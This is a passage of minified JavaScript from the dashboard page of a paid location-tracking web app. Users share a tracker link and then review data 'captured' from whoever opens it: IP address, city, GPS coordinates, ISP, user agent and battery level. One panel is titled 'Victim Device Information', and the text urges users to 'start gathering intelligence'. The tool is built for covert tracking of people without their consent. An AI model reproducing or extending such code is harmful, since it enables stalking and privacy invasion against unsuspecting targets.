ent.getElementById("delete-confirmation-modal").classList.add("active")});addListenerSafe("confirm-delete-btn","click",handleAccountDelete);addListenerSafe("change-profile-btn","click",()=>document.getElementById("avatar-input").click());addListenerSafe("avatar-input","change",handleAvatarChange);addListenerSafe("upload-avatar-btn","click",handleAvatarUpload);setupModal("intel-modal");setupModal("delete-confirmation-modal");setupModal("about-modal");setupModal("cropper-modal");setupModal("no-coins-modal")}function handleAvatarChange(e){const file=e.target.files[0];if(!file)return;const reader=new FileReader;reader.onload=event=>{const cropperImage=document.getElementById("cropper-image");cropperImage.src=event.target.result;document.getElementById("cropper-modal").classList.add("active");if(cropper){cropper.destroy()}cropper=new Cropper(cropperImage,{aspectRatio:1,viewMode:1,background:false})};reader.readAsDataURL(file);e.target.value=""}async function handleAvatarUpload(){const uploadBtn=document.getElementById("upload-avatar-btn");uploadBtn.disabled=true;uploadBtn.textContent="Uploading...";const canvas=cropper.getCroppedCanvas({width:256,height:256});canvas.toBlob(async blob=>{try{const filePath=`public/${loggedInUser.id}`;const{error:uploadError}=await supabase.storage.from("avatars").upload(filePath,blob,{upsert:true});if(uploadError)throw uploadError;const{data:{publicUrl}}=supabase.storage.from("avatars").getPublicUrl(filePath);const finalUrl=`${publicUrl}?t=${new Date().getTime()}`;const{error:updateError}=await supabase.from("users").update({avatar_url:finalUrl}).eq("id_auth",loggedInUser.id);if(updateError)throw updateError;const{data,error:authUpdateError}=await supabase.auth.updateUser({data:{avatar_url:finalUrl}});if(authUpdateError)throw authUpdateError;loggedInUser=data.user;currentUserProfile.avatar_url=finalUrl;document.getElementById("profile-avatar").src=finalUrl;document.getElementById("profile-page-avatar").src=finalUrl;showToast("Profile picture updated!","success");document.getElementById("cropper-modal").classList.remove("active")}catch(error){showToast(`Error: ${error.message}`,"error")}finally{uploadBtn.disabled=false;uploadBtn.textContent="Crop & Upload"}},"image/png")}function generateTrackerId(length=6){const chars="abcdefghijklmnopqrstuvwxyz0123456789";let result="";for(let i=0;i<length;i++){result+=chars.charAt(Math.floor(Math.random()*chars.length))}return result}async function setupUserProfile(user){const{data:profile,error}=await supabase.from("users").select("*").eq("id_auth",user.id).single();if(profile)return profile;const[deviceToken,ip]=await Promise.all([getDeviceFingerprint(),getIpAddress()]);const newUsername=(user.email.split("@")[0]+Math.floor(Math.random()*100)).replace(/[^a-zA-Z0-9]/g,"");const newProfileData={id_auth:user.id,username:newUsername,email:user.email,password:"social_login",tracker_id:generateTrackerId(),device_token:deviceToken,registration_ip:ip,avatar_url:user.user_metadata.avatar_url,coins:0};const{data:newProfile,error:upsertError}=await supabase.from("users").upsert(newProfileData,{onConflict:'id_auth'}).select().single();if(upsertError){console.error("Error creating profile:",upsertError);throw upsertError}return newProfile}async function displayDashboard(userProfile,user){const avatarUrl=userProfile.avatar_url||user.user_metadata.avatar_url;document.getElementById("welcome-username").textContent=userProfile.username;document.getElementById("header-coin-count").textContent=userProfile.coins!==undefined?userProfile.coins:0;document.getElementById("profile-avatar").src=avatarUrl||"https://via.placeholder.com/48";document.getElementById("profile-page-avatar").src=avatarUrl||"https://via.placeholder.com/100";document.getElementById("profile-page-username").textContent=userProfile.username;document.getElementById("profile-page-email").textContent=user.email;applyTheme(userProfile.is_dark_mode);document.getElementById("share-link").value=`${window.location.origin}/t/${userProfile.tracker_id}`||"Could not generate link.";fetchLocations(userProfile.username)}async function handleUsernameUpdate(){const newUsername=document.getElementById("edit-username-input").value.trim();if(!newUsername||newUsername.length<3){showToast("Username must be at least 3 characters.","error");return}const saveBtn=document.getElementById("save-username-btn");saveBtn.disabled=true;saveBtn.textContent="Saving...";try{const{data,error}=await supabase.from("users").update({username:newUsername}).eq("id_auth",loggedInUser.id).select().single();if(error)throw error;showToast("Username updated successfully!","success");currentUserProfile.username=newUsername;document.getElementById("welcome-username").textContent=newUsername;document.getElementById("profile-page-username").textContent=newUsername;document.getElementById("profile-edit-section").classList.remove("active");document.getElementById("profile-menu").style.display="block"}catch(error){showToast(`Error: ${error.message}`,"error")}finally{saveBtn.disabled=false;saveBtn.textContent="Save"}}async function fetchLocations(username){const locationsGrid=document.getElementById("locations-grid");const messageArea=document.getElementById("message-area");locationsGrid.innerHTML="";const{data,error}=await supabase.from("locations").select("*").eq("tracked_by_username",username).order("created_at",{ascending:false});if(error){console.error("Error fetching locations:",error);return}allLocationsCache.length=0;allLocationsCache.push(...data);if(data&&data.length>0){messageArea.style.display="none";data.forEach(loc=>{const card=document.createElement("div");card.className="location-card";const capturedDate=(new Date(loc.created_at)).toLocaleString();card.innerHTML=`<div class="card-body"><span class="label">Captured At</span><span class="value">${capturedDate}</span><span class="label">IP Address</span><span class="value">${loc.ip_address||"N/A"}</span><span class="label">City</span><span class="value">${loc.city||"N/A"}</span></div><div class="card-actions"><a class="map-link ${!isLocationAvailable(loc)?"disabled":""}" href="javascript:void(0)" onclick="openMap('${loc.latitude}','${loc.longitude}')">View Map</a><button class="action-btn" data-location-id="${loc.id}">Device Info</button></div>`;locationsGrid.appendChild(card)});locationsGrid.querySelectorAll(".action-btn").forEach(btn=>btn.addEventListener("click",()=>showIntelModal(btn.dataset.locationId)))}else{messageArea.innerHTML=`<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none"><path d="M12 21C15.5 17.4 19 14.1764 19 10.2C19 6.22355 15.866 3 12 3C8.13401 3 5 6.22355 5 10.2C5 14.1764 8.5 17.4 12 21Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M12 12C13.1046 12 14 11.1046 14 10C14 8.89543 13.1046 8 12 8C10.8954 8 10 8.89543 10 10C10 11.1046 10.8954 12 12 12Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg><h3>No Locations Captured Yet</h3><p>Share your tracking link to start gathering intelligence.</p>`;messageArea.style.display="block"}}async function handleAccountDelete(){const confirmBtn=document.getElementById("confirm-delete-btn");confirmBtn.disabled=true;confirmBtn.textContent="Deleting...";try{const{error}=await supabase.rpc('purge_user_by_username',{p_username:currentUserProfile.username});if(error)throw error;showToast("Account deleted successfully.","success");setTimeout(()=>signOutUser(),2e3)}catch(error){console.error("Delete error:",error);showToast(`Error: ${error.message||"Failed to delete account."}`,"error");confirmBtn.disabled=false;confirmBtn.textContent="Confirm Delete"}}function listenForBans(){const channel=supabase.channel("public:banned_tokens").on("postgres_changes",{event:"*",schema:"public",table:"banned_tokens"},payload=>{if(payload.new&&payload.new.token){const bannedToken=payload.new.token;getDeviceFingerprint().then(currentToken=>{if(currentToken&&bannedToken===currentToken){showToast("Your access has been revoked.","error");setTimeout(()=>signOutUser(),3e3)}})}}).subscribe()}async function signOutUser(){await supabase.auth.signOut();localStorage.removeItem("adminLoggedIn");window.location.href="login.html"}async function copyShareLink(){const copyBtn=document.getElementById("copy-btn");if(copyBtn.disabled)return;copyBtn.disabled=true;try{const{data,error}=await supabase.rpc('deduct_coin',{p_user_id:loggedInUser.id});if(error)throw error;if(data===true){if(typeof AndroidNative!=='undefined'&&AndroidNative.showInterstitial){AndroidNative.showInterstitial()}const shareLinkInput=document.getElementById("share-link");navigator.clipboard.writeText(shareLinkInput.value).then(()=>{showToast("Link copied! 5 Coins used.")});currentUserProfile.coins-=5;document.getElementById("header-coin-count").textContent=currentUserProfile.coins}else{document.getElementById("no-coins-modal").classList.add("active")}}catch(e){console.error("Coin Error:",e);showToast("Failed to process coin.","error")}finally{copyBtn.disabled=false}}function setupModal(modalId){const modal=document.getElementById(modalId);if(!modal)return;const closeBtn=modal.querySelector(".modal-close");if(closeBtn)closeBtn.onclick=()=>modal.classList.remove("active");document.getElementById("cancel-delete-btn")?.addEventListener("click",()=>document.getElementById("delete-confirmation-modal").classList.remove("active"));document.getElementById("cancel-crop-btn")?.addEventListener("click",()=>document.getElementById("cropper-modal").classList.remove("active"));window.addEventListener("click",event=>{if(event.target==modal){modal.classList.remove("active")}}) }function applyTheme(isDark){document.body.className=isDark?"super-dark-mode":"";document.getElementById("theme-toggle-checkbox").checked=isDark}async function toggleTheme(userId){const newThemeState=document.getElementById("theme-toggle-checkbox").checked;applyTheme(newThemeState);try{await supabase.from("users").update({is_dark_mode:newThemeState}).eq("id_auth",userId)}catch(error){console.error("Failed to update theme:",error)}}function isLocationAvailable(loc){const deniedValues=["Permission Denied","Pending..."];return!deniedValues.includes(loc.latitude)&&loc.latitude!==null}function openMap(lat,long){if(lat==="Permission Denied"||lat==="Pending...")return;if(typeof AndroidNative!=='undefined'&&AndroidNative.showRewardedAd){AndroidNative.showRewardedAd(lat,long)}else{window.open(`https://www.google.com/maps?q=${lat},${long}`)}}function showIntelModal(locationId){const modal=document.getElementById("intel-modal");const d=allLocationsCache.find(loc=>loc.id==locationId);if(!d){return}if(typeof AndroidNative!=='undefined'&&AndroidNative.showInterstitial){AndroidNative.showInterstitial()}const isLocAvail=isLocationAvailable(d);const locationString=isLocAvail?`${d.latitude}, ${d.longitude}`:d.latitude||"N/A";const timestamp=(new Date(d.created_at)).toISOString().replace("Z","+00:00").replace(".000","");const fields=[{label:"Timestamp",value:timestamp},{label:"IpAddress",value:d.ip_address||"N/A"},{label:"City",value:d.city||"N/A"},{label:"Region",value:d.region||"N/A"},{label:"Country",value:d.country||"N/A"},{label:"Location",value:locationString},{label:"Isp",value:d.isp||"N/A"},{label:"UserAgent",value:d.user_agent||"N/A"},{label:"Platform",value:d.platform||"N/A"},{label:"BatteryLevel",value:d.battery_level!==null?`${d.battery_level}%`:"N/A"}];let intelHTML='<div class="modal-content"><div class="modal-header"><h3>Victim Device Information</h3><span class="modal-close">×</span></div><div class="modal-body"><div class="detail-grid">';fields.forEach(field=>{intelHTML+=`<div class="detail-item"><span class="detail-label">${field.label}</span><span class="detail-value">${field.value||"N/A"}</span></div>`});intelHTML+='</div></div></div>';modal.innerHTML=intelHTML;modal.classList.add("active");setupModal("intel-modal")}function showToast(message,type="success"){const container=document.getElementById("toast-container");const toast=document.createElement("div");toast.className=`toast ${type}`;const icon=type==="success"?"✓":"✗";toast.innerHTML=`<span class="toast-icon">${icon}</span><span>${message}</span>`;container.appendChild(toast);setTimeout(()=>{toast.style.animation="toast-out .5s forwards";setTimeout(()=>toast.remove(),500)},4e3)}document.addEventListener("DOMContentLoaded",initApp);</script></body></html> 
